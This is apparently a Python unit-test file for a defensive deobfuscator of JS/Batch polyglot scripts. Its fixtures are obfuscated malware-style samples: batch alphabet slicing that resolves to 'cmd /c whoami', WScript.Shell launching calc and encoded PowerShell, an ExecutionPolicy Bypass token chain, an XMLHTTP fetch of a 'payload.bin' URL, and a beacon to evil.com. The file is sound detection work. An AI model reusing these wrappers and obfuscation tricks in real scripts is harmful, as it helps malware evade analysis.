#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Unit and integration tests for JSBatchDeobfuscator and hybrid JS/BAT polyglot extraction.
Tests:
  1. Signature detection across polyglot styles and alphabet slicing matrices.
  2. guillaC / yrotak alphabet harvesting and key extraction.
  3. Substring slice resolution (%key:~idx,len%) and @echo off normalization.
  4. Chained SET token assembly (Corpus 15 parity).
  5. Polyglot decomposition:
     - 0 /* :: comment block wrapper
     - /* & @echo off comment block wrapper
     - @if (@CodeSection == @Batch) JScript conditional compilation
     - WSF XML hybrid (<!-- : ... --> <job>)
     - MSHTA inline JavaScript
  6. Static JScript deobfuscation (unescape, String.fromCharCode, hex escapes, ActiveX/URL extraction).
  7. In-memory cryptographic zeroization and context manager lifecycle.
"""

import unittest
from deobfuscator.jsbatch import (
    detect_jsbatch_signatures,
    harvest_jsbatch_alphabet,
    resolve_jsbatch_slices,
    resolve_chained_set_tokens,
    deobfuscate_jscript_code,
    extract_polyglot_components,
    normalize_jsbatch,
    JSBatchNormalizer,
    zeroize_dict,
    zeroize_bytes,
)


class TestJSBatchDeobfuscator(unittest.TestCase):
    """Test suite for JSBatchDeobfuscator and hybrid JS/BAT polyglots."""

    def setUp(self):
        self.alphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        self.guillac_script = (
            "Set ab9=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\n"
            "cls\n"
            "@%ab9:~14,1%%ab9:~12,1%%ab9:~17,1%%ab9:~24,1% %ab9:~24,1%%ab9:~15,1%%ab9:~15,1%\n"
            "%ab9:~12,1%%ab9:~22,1%%ab9:~13,1% /c %ab9:~32,1%%ab9:~17,1%%ab9:~24,1%%ab9:~10,1%%ab9:~22,1%%ab9:~18,1%"
        )

    def test_signature_detection_jsbatch_slicing(self):
        sig = detect_jsbatch_signatures(self.guillac_script)
        self.assertTrue(sig["is_jsbatch"])
        self.assertGreaterEqual(sig["confidence"], 0.3)
        self.assertIn("jsbatch_alphabet_slicing_matrix", sig["indicators"])
        self.assertEqual(sig["details"]["harvested_key"], "ab9")

    def test_signature_detection_polyglot_comment_block(self):
        script = (
            "0 /* ::\n"
            "@echo off\n"
            'cscript //nologo //E:jscript "%~f0" %*\n'
            "exit /b\n"
            "*/\n"
            'var sh = new ActiveXObject("WScript.Shell");\n'
            'sh.Run("calc.exe", 0);\n'
        )
        sig = detect_jsbatch_signatures(script)
        self.assertTrue(sig["is_jsbatch"])
        self.assertTrue(sig["is_polyglot"])
        self.assertEqual(sig["polyglot_type"], "comment_block")
        self.assertIn("polyglot_comment_block_wrapper", sig["indicators"])

    def test_signature_detection_conditional_compilation(self):
        script = (
            "@if (@CodeSection == @Batch) @then\n"
            "@echo off\n"
            'CScript //nologo //E:JScript "%~F0" %*\n'
            "goto :EOF\n"
            "@end\n"
            'WScript.Echo("Hello JScript");\n'
        )
        sig = detect_jsbatch_signatures(script)
        self.assertTrue(sig["is_jsbatch"])
        self.assertTrue(sig["is_polyglot"])
        self.assertEqual(sig["polyglot_type"], "conditional_compilation")
        self.assertIn("polyglot_jscript_conditional_compilation", sig["indicators"])

    def test_signature_detection_chained_set(self):
        script = "set part1=pow&set part2=ershell&%part1%%part2% -ExecutionPolicy Bypass"
        sig = detect_jsbatch_signatures(script)
        self.assertTrue(sig["is_jsbatch"])
        self.assertIn("chained_set_token_transpilation", sig["indicators"])

    def test_harvest_jsbatch_alphabet(self):
        key, alpha, line_idx = harvest_jsbatch_alphabet(self.guillac_script)
        self.assertEqual(key, "ab9")
        self.assertEqual(alpha, self.alphabet)
        self.assertEqual(line_idx, 0)

    def test_resolve_jsbatch_slices(self):
        key = "ab9"
        # 14=e, 12=c, 17=h, 24=o, 15=f
        # 12=c, 22=m, 13=d -> cmd
        # 32=w, 17=h, 24=o, 10=a, 22=m, 18=i -> whoami
        resolved, count = resolve_jsbatch_slices(self.guillac_script, key, self.alphabet)
        self.assertIn("@echo off", resolved)
        self.assertIn("cmd /c whoami", resolved)
        self.assertGreater(count, 5)

    def test_resolve_chained_set_tokens_corpus15(self):
        script = "set part1=pow&set part2=ershell&%part1%%part2% -ExecutionPolicy Bypass"
        resolved, count = resolve_chained_set_tokens(script)
        self.assertEqual(resolved.strip(), "powershell -ExecutionPolicy Bypass")
        self.assertGreaterEqual(count, 2)

    def test_extract_polyglot_comment_block(self):
        script = (
            "0 /* ::\n"
            "@echo off\n"
            "echo Running Batch Stage\n"
            'cscript //nologo //E:jscript "%~f0" %*\n'
            "exit /b\n"
            "*/\n"
            'var shell = new ActiveXObject("WScript.Shell");\n'
            'shell.Run("powershell.exe -enc AAAA", 0);\n'
        )
        comp = extract_polyglot_components(script)
        self.assertTrue(comp["is_polyglot"])
        self.assertEqual(comp["polyglot_type"], "comment_block")
        self.assertIn("echo Running Batch Stage", comp["batch_code"])
        self.assertNotIn("cscript", comp["batch_code"])
        self.assertIn('new ActiveXObject("WScript.Shell")', comp["js_code"])
        self.assertIn("WScript.Shell", comp["activex_objects"])

    def test_extract_polyglot_conditional_compilation(self):
        script = (
            "@if (@CodeSection == @Batch) @then\n"
            "@echo off\n"
            "set TARGET=test\n"
            'CScript //nologo //E:JScript "%~F0" %*\n'
            "goto :EOF\n"
            "@end\n"
            'var ws = new ActiveXObject("WScript.Shell");\n'
            'ws.Echo("JScript Active");\n'
        )
        comp = extract_polyglot_components(script)
        self.assertTrue(comp["is_polyglot"])
        self.assertEqual(comp["polyglot_type"], "conditional_compilation")
        self.assertIn("set TARGET=test", comp["batch_code"])
        self.assertNotIn("goto :EOF", comp["batch_code"])
        self.assertIn("WScript.Shell", comp["activex_objects"])

    def test_extract_polyglot_wsf(self):
        script = (
            "<!-- :\n"
            "@echo off\n"
            'cscript //nologo "%~f0?.wsf" %*\n'
            "exit /b\n"
            "-->\n"
            "<job>\n"
            '<script language="JScript">\n'
            'var http = new ActiveXObject("MSXML2.XMLHTTP");\n'
            'http.open("GET", "https://api.example.com/payload.bin", false);\n'
            "</script>\n"
            "</job>\n"
        )
        comp = extract_polyglot_components(script)
        self.assertTrue(comp["is_polyglot"])
        self.assertEqual(comp["polyglot_type"], "wsf_hybrid")
        self.assertIn("@echo off", comp["batch_code"])
        self.assertIn("MSXML2.XMLHTTP", comp["activex_objects"])
        self.assertIn("https://api.example.com/payload.bin", comp["extracted_urls"])

    def test_extract_polyglot_mshta(self):
        script = '@echo off & mshta "javascript:var x=new ActiveXObject(\'WScript.Shell\');x.Run(\'calc.exe\',0);close();"'
        comp = extract_polyglot_components(script)
        self.assertTrue(comp["is_polyglot"])
        self.assertEqual(comp["polyglot_type"], "mshta_inline")
        self.assertIn("WScript.Shell", comp["activex_objects"])

    def test_deobfuscate_jscript_code_unescape_and_charcode(self):
        js = (
            'var u = unescape("%63%61%6c%63%2e%65%78%65");\n'
            'var c = String.fromCharCode(119, 104, 111, 97, 109, 105);\n'
            'var s = "http://" + "evil.com" + "/beacon";\n'
        )
        deob, meta = deobfuscate_jscript_code(js)
        self.assertIn('"calc.exe"', deob)
        self.assertIn('"whoami"', deob)
        self.assertIn('"http://evil.com/beacon"', deob)
        self.assertIn("http://evil.com/beacon", meta["extracted_urls"])
        self.assertEqual(meta["unescape_resolved"], 1)
        self.assertEqual(meta["fromcharcode_resolved"], 1)

    def test_normalize_jsbatch_e2e_guillac(self):
        normalized, meta = normalize_jsbatch(self.guillac_script)
        self.assertTrue(meta["is_jsbatch"])
        self.assertEqual(meta["alphabet_key"], "ab9")
        self.assertIn("@echo off", normalized)
        self.assertIn("cmd /c whoami", normalized)
        # Verify Set ab9=... and cls were stripped
        self.assertNotIn("Set ab9=", normalized)
        self.assertNotIn("cls", normalized.splitlines())

    def test_normalize_jsbatch_e2e_polyglot(self):
        polyglot = (
            "0 /* ::\n"
            "@echo off\n"
            "echo Starting Setup\n"
            'cscript //nologo //E:jscript "%~f0" %*\n'
            "exit /b\n"
            "*/\n"
            'var sh = new ActiveXObject("WScript.Shell");\n'
            'sh.Run("cmd.exe /c " + unescape("%77%68%6f%61%6d%69"), 0);\n'
        )
        normalized, meta = normalize_jsbatch(polyglot)
        self.assertTrue(meta["is_polyglot"])
        self.assertIn("echo Starting Setup", normalized)
        self.assertIn("[EXTRACTED JSCRIPT / JAVASCRIPT PAYLOAD]", normalized)
        self.assertIn("WScript.Shell", meta["activex_objects"])
        self.assertIn('"cmd.exe /c whoami"', normalized)

    def test_normalizer_class_and_zeroize(self):
        with JSBatchNormalizer() as norm:
            norm_res, meta = norm.normalize(self.guillac_script)
            self.assertIn("cmd /c whoami", norm_res)
            self.assertGreater(meta["slices_resolved"], 0)
        # After exiting, custom_env should be cleared
        self.assertEqual(len(norm.custom_env), 0)

    def test_zeroize_memory(self):
        d = {"key": "secret", "nested": {"tok": "abc"}, "arr": [1, 2, 3]}
        zeroize_dict(d)
        self.assertEqual(len(d), 0)

        b = bytearray(b"sensitive_buffer")
        zeroize_bytes(b)
        self.assertTrue(all(byte == 0 for byte in b))


if __name__ == "__main__":
    unittest.main()
